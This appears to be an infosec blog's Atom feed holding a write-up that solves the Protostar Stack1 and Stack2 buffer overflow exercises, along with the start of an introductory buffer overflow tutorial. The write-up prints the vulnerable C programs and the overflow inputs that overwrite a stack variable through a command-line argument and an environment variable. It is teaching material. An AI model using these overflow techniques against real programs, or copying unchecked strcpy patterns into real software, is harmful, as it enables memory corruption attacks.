<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-01-06T23:35:33+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2</title><link href="http://localhost:4000/binary-exploitation/bof2/" rel="alternate" type="text/html" title="Buffer Overflow Practical Examples , Hexadecimal values and Environment Variables ! - Protostar Stack1 , Stack2" /><published>2018-12-30T00:00:00+02:00</published><updated>2018-12-30T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof2</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof2/">&lt;hr /&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;h4 id=&quot;so-last-week-i-talked-about-bufferoverflows-and-solved-protostar-stack0-today-im-gonna-solve-stack1-and-stack2-they-are-not-different-from-stack0-in-their-objective-which-is-changing-a-variables-value--but-they-are-different-in-the-way-of-changing-that-variable-for-sure-with-that-being-said-lets-jump-right-in-&quot;&gt;So last week I talked about bufferoverflows and solved Protostar Stack0. Today I’m gonna solve Stack1 and Stack2, they are not different from Stack0 in their objective which is changing a variable’s value , but they are different in the way of changing that variable for sure. With that being said let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-you-havent-read-my-previous-post-yet-i-recommend-reading-it-before-this&quot;&gt;If you haven’t read my previous &lt;a href=&quot;/BinaryExploitation-BOF/&quot;&gt;post&lt;/a&gt; yet I recommend reading it before this.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;stack1&quot;&gt;Stack1&lt;/h2&gt;
&lt;h4 id=&quot;for-this-challenge-we-got-this-code-&quot;&gt;For this challenge we got this code :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];

 if(argc == 1) {
  errx(1, &quot;please specify an argument\n&quot;);
 }

 modified = 0;
 strcpy(buffer, argv[1]);

 if(modified == 0x61626364) {
  printf(&quot;you have correctly got the variable to the right value\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;breakdown&quot;&gt;Breakdown&lt;/h3&gt;
&lt;h4 id=&quot;so-this-code-&quot;&gt;So this code :&lt;/h4&gt;
&lt;h4 id=&quot;creates-a-variable-called-modified-and-assigns-a-buffer-of-64-chars-to-it&quot;&gt;creates a variable called “modified” and assigns a buffer of 64 chars to it.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;volatile int modified; 
char buffer[64];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;checks-if-we-supplied-an-argument-or-not&quot;&gt;Checks if we supplied an argument or not.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; if(argc == 1) {
  errx(1, &quot;please specify an argument\n&quot;);
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;sets-the-value-of-the-modified-variable-into-0--then-it-copies-whatever-we-give-it-argv1-into-the-buffer-of-modified&quot;&gt;Sets the value of the “modified” variable into 0 , then it copies whatever we give it &lt;code class=&quot;highlighter-rouge&quot;&gt;argv[1]&lt;/code&gt; into the buffer of “modified”.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;modified = 0;
strcpy(buffer, argv[1]);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-it-checks-if-the-variables-value-is-0x61626364-or-not&quot;&gt;Then it checks if the variable’s value is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x61626364&lt;/code&gt; or not&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(modified == 0x61626364) {
  printf(&quot;you have correctly got the variable to the right value\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;solution&quot;&gt;Solution&lt;/h2&gt;
&lt;h4 id=&quot;so-its-similar-to-stack0-except-we-need-to-set-the-value-of-the-variable-into-a-specific-value-which-is-0x61626364-in-this-case-this-is-the-hexadecimal-value-of-dcba-now-keep-in-mind-that-when-reading-hex-you-read-it-from-right-to-left-not-left-to-right-to-slove-this-our-input-will-be-64-chars-then-after-that-the-value--lets-try-it&quot;&gt;So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x61626364&lt;/code&gt; in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it.&lt;/h4&gt;
&lt;h4 id=&quot;lets-execute-stack1&quot;&gt;Let’s execute stack1&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-please-specify-an-argument-so-lets-enter-anything&quot;&gt;We get please specify an argument so let’s enter anything.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/2.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/binary-exploitation/BOF2/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-try-again-you-got-0x00000000--lets-try-to-change-that-by-exceeding-the-buffer-and-entering-any-char-for-example-b&quot;&gt;We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b”&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./stack1 `python -c &quot;print ('A' * 64 + 'b')&quot;`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-that-the-value-changed-to-0x00000062-which-is-the-hex-value-of-b-so-our-exploit-is-working-lets-apply-that&quot;&gt;And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./stack1 `python -c &quot;print ('A' * 64 + 'dcba')&quot;`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-did-it-&quot;&gt;And we did it !&lt;/h4&gt;
&lt;h4 id=&quot;but-can-we-do-it-in-another-way--instead-of-entering-ascii-we-can-use-the-hex-values-and-python-will-translate-them&quot;&gt;But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./stack1 `python -c &quot;print('A' * 64 + '\x64\x63\x62\x61')&quot;`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/6.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;stack2&quot;&gt;Stack2&lt;/h2&gt;
&lt;h4 id=&quot;for-this-challenge-we-got-this-code--1&quot;&gt;For this challenge we got this code :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;

int main(int argc, char **argv)
{
 volatile int modified;
 char buffer[64];
 char *variable;

 variable = getenv(&quot;GREENIE&quot;);

 if(variable == NULL) {
  errx(1, &quot;please set the GREENIE environment variable\n&quot;);
 }

 modified = 0;

 strcpy(buffer, variable);

 if(modified == 0x0d0a0d0a) {
  printf(&quot;you have correctly modified the variable\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }

}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;breakdown-1&quot;&gt;Breakdown&lt;/h3&gt;
&lt;h4 id=&quot;this-code-&quot;&gt;This code :&lt;/h4&gt;
&lt;h4 id=&quot;as-always-creates-a-variable-called-modified-and-assigns-a-buffer-of-64-chars-to-it&quot;&gt;As always creates a variable called “modified” and assigns a buffer of 64 chars to it&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;volatile int modified;
char buffer[64];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-new-thing-here-is-a-variable-called-variable-which-gets-its-value-from-an-environment-variable-called-greenie&quot;&gt;The new thing here is a variable called “variable” which gets its value from an environment variable called “GREENIE”.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;variable = getenv(&quot;GREENIE&quot;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-program-checks-if-the-variable-variable-has-a-value-or-not&quot;&gt;The program checks if the variable “variable” has a value or not&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(variable == NULL) {
  errx(1, &quot;please set the GREENIE environment variable\n&quot;);
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;sets-the-value-of-modified-to-0&quot;&gt;Sets the value of modified to 0&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;modified = 0;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-it-copies-the-value-of-variable-into-the-buffer-of-modified&quot;&gt;Then it copies the value of “variable” into the buffer of “modified”&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strcpy(buffer, variable);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-that-it-checks-if-the-value-of-modified-is-0x0d0a0d0a-or-not&quot;&gt;After that it checks if the value of “modified” is &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0d0a0d0a&lt;/code&gt; or not&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(modified == 0x0d0a0d0a) {
  printf(&quot;you have correctly modified the variable\n&quot;);
 } else {
  printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
 }
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;solution-1&quot;&gt;Solution&lt;/h2&gt;
&lt;h4 id=&quot;so-this-time-we-cant-specify-the-value-directly-instead-of-that-we-have-to-do-it-through-an-environment-variable-and-this-is-actually-a-good-example-that-shows-the-importance-of-being-creative-with-your-exploits--you-wont-face-the-same-situation-every-time-so-you-have-to-come-up-with-an-exploit-that-fits-with-the-applications-functionality&quot;&gt;So this time we can’t specify the value directly instead of that we have to do it through an environment variable. And this is actually a good example that shows the importance of being creative with your exploits , you won’t face the same situation every time so you have to come up with an exploit that fits with the application’s functionality.&lt;/h4&gt;
&lt;h4 id=&quot;in-this-situation-we-can-apply-our-usual-exploit-and-store-that-value-into-the-environment-variable-greenie&quot;&gt;In this situation we can apply our usual exploit and store that value into the environment variable “GREENIE”.&lt;/h4&gt;
&lt;h4 id=&quot;but-wait-a-minute--what-is-an-environment-variable-&quot;&gt;But wait a minute , what is an environment variable ?&lt;/h4&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;environment-variables&quot;&gt;Environment Variables&lt;/h3&gt;
&lt;h4 id=&quot;simply--environment-variables-are-variables-that-are-being-used-to-store-values-of-some-stuff-that-the-system-uses-also-the-services-can-access-those-variables-for-a-better-demonstration-lets-see-an-example&quot;&gt;Simply , Environment variables are variables that are being used to store values of some stuff that the system uses also the services can access those variables. For a better demonstration let’s see an example.&lt;/h4&gt;
&lt;h4 id=&quot;if-we-take-the-environment-variable-bash-and-look-at-it-&quot;&gt;If we take the environment variable BASH and look at it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-see-that-its-value-is--binbash&quot;&gt;We see that its value is : /bin/bash&lt;/h4&gt;
&lt;h4 id=&quot;so-for-example-if-i-want-to-run-bash-i-type-bash-in-the-terminal-instead-of-binbash-because-the-system-calls-the-variable-bash-and-finds-its-path&quot;&gt;So for example if I want to run bash I type bash in the terminal instead of &lt;code class=&quot;highlighter-rouge&quot;&gt;./bin/bash&lt;/code&gt; because the system calls the variable BASH and finds its path.&lt;/h4&gt;
&lt;h4 id=&quot;but-the-system-wont-store-a-variable-for-every-binary-that-exists-on-the-system-so-theres-an-environment-variable-called-path-which-has-all-the-possible-dirs-that-could-contain-bins-so-when-you-type-for-example--python-it-searches-in-those-dirs-then-executes-python&quot;&gt;But the system won’t store a variable for every binary that exists on the system so there’s an environment variable called PATH which has all the possible dirs that could contain bins, So when you type for example : python, it searches in those dirs then executes python&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;so-you-get-the-idea-understanding-environment-variables-is-not-necessary-for-this-challenge-but-i-wanted-to-talk-about-it-just-to-make-everything-clear-for-anyone&quot;&gt;So you get the idea. Understanding environment variables is not necessary for this challenge but I wanted to talk about it just to make everything clear for anyone.&lt;/h4&gt;
&lt;h4 id=&quot;more-about-environment-variables&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Environment_variable&quot;&gt;More about environment variables&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;now-lets-execute-stack2&quot;&gt;Now let’s execute stack2&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-please-set-the-greenie-environment-variable&quot;&gt;We get Please set the GREENIE environment variable.&lt;/h4&gt;
&lt;h4 id=&quot;theres-no-environment-variable-called-greenie-so-we-need-to-create-it-we-will-make-its-value-equal-to-64-chars-then-0x0d0a0d0a&quot;&gt;There’s no environment variable called GREENIE so we need to create it. We will make it’s value equal to 64 chars then &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0d0a0d0a&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;this-time-we-wont-be-able-to-use-the-value-in-ascii-like-we-did-with-stack1-because-0x0d-is-a-return-r-and-0x0a-is-a-new-line-n-and-we-cant-type-those-so-we-will-use-the-hex-values-and-python-will-translate-them&quot;&gt;This time we won’t be able to use the value in ASCII like we did with stack1 because &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0d&lt;/code&gt; is a return &lt;code class=&quot;highlighter-rouge&quot;&gt;\r&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0a&lt;/code&gt; is a new line &lt;code class=&quot;highlighter-rouge&quot;&gt;\n&lt;/code&gt; and we can’t type those so we will use the hex values and python will translate them.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GREENIE = `python -c &quot;print ('A' * 64 + '\x0a\x0d\x0a\x0d')&quot;`
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;when-we-look-at-it-we-only-see-the-64-as-and-thats-because-we-cant-see-the-new-line-or-the-return&quot;&gt;When we look at it we only see the 64 A’s and that’s because we can’t see the new line or the return&lt;/h4&gt;
&lt;h4 id=&quot;now-we-need-to-export-it-to-the-environment-variables-list-then-we-are-good-to-go&quot;&gt;Now we need to export it to the environment variables list then we are good to go.&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;export GREENIE
./stack2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF2/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-did-it--1&quot;&gt;And we did it !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated&quot;&gt;That’s it , Feedback is appreciated.&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading-&quot;&gt;Thanks for reading !&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Introduction So last week I talked about bufferoverflows and solved Protostar Stack0. Today I’m gonna solve Stack1 and Stack2, they are not different from Stack0 in their objective which is changing a variable’s value , but they are different in the way of changing that variable for sure. With that being said let’s jump right in ! If you haven’t read my previous post yet I recommend reading it before this. Stack1 For this challenge we got this code : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; if(argc == 1) { errx(1, &quot;please specify an argument\n&quot;); } modified = 0; strcpy(buffer, argv[1]); if(modified == 0x61626364) { printf(&quot;you have correctly got the variable to the right value\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } } Breakdown So this code : creates a variable called “modified” and assigns a buffer of 64 chars to it. volatile int modified; char buffer[64]; Checks if we supplied an argument or not. if(argc == 1) { errx(1, &quot;please specify an argument\n&quot;); } Sets the value of the “modified” variable into 0 , then it copies whatever we give it argv[1] into the buffer of “modified”. modified = 0; strcpy(buffer, argv[1]); Then it checks if the variable’s value is 0x61626364 or not if(modified == 0x61626364) { printf(&quot;you have correctly got the variable to the right value\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } Solution So it’s similar to Stack0 except we need to set the value of the variable into a specific value which is 0x61626364 in this case. This is the hexadecimal value of “dcba” now keep in mind that when reading hex you read it from right to left not left to right. To slove this our input will be 64 chars then after that the value , let’s try it. Let’s execute stack1 We get please specify an argument so let’s enter anything. We get try again you got 0x00000000 , Let’s try to change that by exceeding the buffer and entering any char for example “b” ./stack1 `python -c &quot;print ('A' * 64 + 'b')&quot;` And we see that the value changed to 0x00000062 which is the hex value of “b” so our exploit is working, Let’s apply that. ./stack1 `python -c &quot;print ('A' * 64 + 'dcba')&quot;` And we did it ! But can we do it in another way ? instead of entering ASCII we can use the hex values and python will translate them. ./stack1 `python -c &quot;print('A' * 64 + '\x64\x63\x62\x61')&quot;` Stack2 For this challenge we got this code : #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; #include &amp;lt;stdio.h&amp;gt; #include &amp;lt;string.h&amp;gt; int main(int argc, char **argv) { volatile int modified; char buffer[64]; char *variable; variable = getenv(&quot;GREENIE&quot;); if(variable == NULL) { errx(1, &quot;please set the GREENIE environment variable\n&quot;); } modified = 0; strcpy(buffer, variable); if(modified == 0x0d0a0d0a) { printf(&quot;you have correctly modified the variable\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } } Breakdown This code : As always creates a variable called “modified” and assigns a buffer of 64 chars to it volatile int modified; char buffer[64]; The new thing here is a variable called “variable” which gets its value from an environment variable called “GREENIE”. variable = getenv(&quot;GREENIE&quot;); The program checks if the variable “variable” has a value or not if(variable == NULL) { errx(1, &quot;please set the GREENIE environment variable\n&quot;); } Sets the value of modified to 0 modified = 0; Then it copies the value of “variable” into the buffer of “modified” strcpy(buffer, variable); After that it checks if the value of “modified” is 0x0d0a0d0a or not if(modified == 0x0d0a0d0a) { printf(&quot;you have correctly modified the variable\n&quot;); } else { printf(&quot;Try again, you got 0x%08x\n&quot;, modified); } Solution So this time we can’t specify the value directly instead of that we have to do it through an environment variable. And this is actually a good example that shows the importance of being creative with your exploits , you won’t face the same situation every time so you have to come up with an exploit that fits with the application’s functionality. In this situation we can apply our usual exploit and store that value into the environment variable “GREENIE”. But wait a minute , what is an environment variable ? Environment Variables Simply , Environment variables are variables that are being used to store values of some stuff that the system uses also the services can access those variables. For a better demonstration let’s see an example. If we take the environment variable BASH and look at it : We see that its value is : /bin/bash So for example if I want to run bash I type bash in the terminal instead of ./bin/bash because the system calls the variable BASH and finds its path. But the system won’t store a variable for every binary that exists on the system so there’s an environment variable called PATH which has all the possible dirs that could contain bins, So when you type for example : python, it searches in those dirs then executes python So you get the idea. Understanding environment variables is not necessary for this challenge but I wanted to talk about it just to make everything clear for anyone. More about environment variables Now let’s execute stack2 We get Please set the GREENIE environment variable. There’s no environment variable called GREENIE so we need to create it. We will make it’s value equal to 64 chars then 0x0d0a0d0a This time we won’t be able to use the value in ASCII like we did with stack1 because 0x0d is a return \r and 0x0a is a new line \n and we can’t type those so we will use the hex values and python will translate them. GREENIE = `python -c &quot;print ('A' * 64 + '\x0a\x0d\x0a\x0d')&quot;` When we look at it we only see the 64 A’s and that’s because we can’t see the new line or the return Now we need to export it to the environment variables list then we are good to go. export GREENIE ./stack2 And we did it ! That’s it , Feedback is appreciated. Thanks for reading !</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF2/0.png" /></entry><entry><title type="html">Binary Exploitation - Buffer Overflow Explained in Detail</title><link href="http://localhost:4000/binary-exploitation/bof1/" rel="alternate" type="text/html" title="Binary Exploitation - Buffer Overflow Explained in Detail" /><published>2018-12-19T00:00:00+02:00</published><updated>2018-12-19T00:00:00+02:00</updated><id>http://localhost:4000/binary-exploitation/bof1</id><content type="html" xml:base="http://localhost:4000/binary-exploitation/bof1/">&lt;hr /&gt;

&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;h4 id=&quot;so-first-of-all-i-know-that-there-are-many-tutorials-published-about-buffer-overflow-and-binary-exploitation-but-i-decided-to-write-this-article-because-most-of-these-tutorials-and-articles-dont-really-talk-about-the-basic-fundmentals-needed-to-understand-what-a-buffer-overflow-really-is-they-just-go-explaining-whats-a-buffer-overflow-without-explaining-what-is-a-buffer--what-is-a-stack-or-what-are-memory-addresses-etc-and-i-just-wanted-to-make-it-easier-for-someone-who-wants-to-learn-about-it-to-find-an-article-that-covers-the-basics-so-what-im-going-to-talk-about-in-this-article-is-what-is-a-buffer--what-is-a-stack-and-what-are-the-memory-addresses-and-we-will-take-a-look-at-the-application-memory-structure--what-is-a-buffer-overflow-and-why-does-it-happen-then-ill-show-a-really-basic-and-simple-example-for-exploiting-a-buffer-overflow-protostar-stack0&quot;&gt;So first of all I know that there are many tutorials published about buffer overflow and binary exploitation but I decided to write this article because most of these tutorials and articles don’t really talk about the basic fundmentals needed to understand what a buffer overflow really is. They just go explaining what’s a buffer overflow without explaining what is a buffer , what is a stack or what are memory addresses etc. And I just wanted to make it easier for someone who wants to learn about it to find an article that covers the basics. So what I’m going to talk about in this article is what is a buffer , what is a stack and what are the memory addresses and we will take a look at the application memory structure , what is a buffer overflow and why does it happen then I’ll show a really basic and simple example for exploiting a buffer overflow (protostar stack0)&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/binary-exploitation/BOF/0.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h2 id=&quot;buffer&quot;&gt;Buffer&lt;/h2&gt;
&lt;h4 id=&quot;so-whats-a-buffer--simply-a-buffer-is-a-memory-place-or-location-which-is-used-by-a-running-program-this-memory-location-is-used-to-store-some-temporary-data-that-is-being-used-by-the-program-so-for-example-if-we-have-a-simple-program-that-asks-the-user-to-enter-his-name-and-stores-it-in-a-variable-called-username-then-it-prints-hello-username---for-example-if-we-run-the-program-and-enter-username-as-rick-the-word-rick-is-stored-in-the-buffer-until-the-program-executes-the-print-command-and-it-retrieves-the-given-username-rick-from-the-buffer-to-output-the-result--hello-rick&quot;&gt;So what’s a buffer ? Simply a buffer is a memory place or location which is used by a running program. This memory location is used to store some temporary data that is being used by the program. So for example if we have a simple program that asks the user to enter his name and stores it in a variable called &lt;em&gt;username&lt;/em&gt; then it prints “Hello &lt;em&gt;username&lt;/em&gt; “ . For example if we run the program and enter username as “Rick”. The word “Rick” is stored in the buffer until the program executes the print command and it retrieves the given username “Rick” from the buffer to output the result : “Hello Rick”&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;our-example-written-in-c-will-be-like-this&quot;&gt;Our example written in c will be like this&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main () {
   char username[20];

   printf(&quot;Enter your name: &quot;);
   scanf(&quot;%s&quot;, username);

   printf(&quot;Hello %s\n&quot;, username);
   
   return(0);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h3 id=&quot;break-down&quot;&gt;Break Down&lt;/h3&gt;
&lt;h4 id=&quot;int-main-this-defines-the-main-function&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int main()&lt;/code&gt; This defines the main function&lt;/h4&gt;
&lt;h4 id=&quot;char-username20-this-is-where-we-specify-the-variable-name-but-the-most-important-thing-about-this-line-is-char--20-this-is-where-we-specify-the-buffer-for-that-variable--and-i-assigned-it-as-20-chars&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;char username[20]&lt;/code&gt; This is where we specify the variable name but the most important thing about this line is &lt;code class=&quot;highlighter-rouge&quot;&gt;char .... [20]&lt;/code&gt; this is where we specify the buffer for that variable , and i assigned it as 20 chars&lt;/h4&gt;
